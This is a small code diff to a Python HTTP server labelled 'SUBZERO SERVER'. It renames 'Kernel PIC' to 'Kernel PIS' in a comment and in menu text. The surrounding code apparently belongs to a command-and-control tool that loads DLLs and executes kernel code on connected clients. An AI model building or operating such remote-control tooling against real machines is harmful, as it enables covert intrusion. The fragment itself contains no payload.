@@ -80,8 +80,8 @@ class Handler(BaseHTTPRequestHandler):
                 # Handle returned data accordingly
                 print(f"[{self.client_address[0]}] Returned data (String): \n{packet_patrameters['Returned-Data'][0]}")
 
-                # In my case - PIC should return a PID
-                print(f"[{self.client_address[0]}] Kernel PIC ran by PID: {ord(packet_patrameters['Returned-Data'][0])}")
+                # In my case - PIS should return a PID
+                print(f"[{self.client_address[0]}] Kernel PIS ran by PID: {ord(packet_patrameters['Returned-Data'][0])}")
 
             screenlock.release()
 
@@ -125,7 +125,7 @@ if __name__ == "__main__":
     print(" |-------------------------|")
     print(" |      SUBZERO SERVER     |")
     print(" | 1 - Load DLL            |")
-    print(" | 2 - Execute Kernel PIC  |")
+    print(" | 2 - Execute Kernel PIS  |")
     print(" | 3 - Remove Client       |")
     print(" | 4 - Stop the Server     |")
     print(" |-------------------------|")
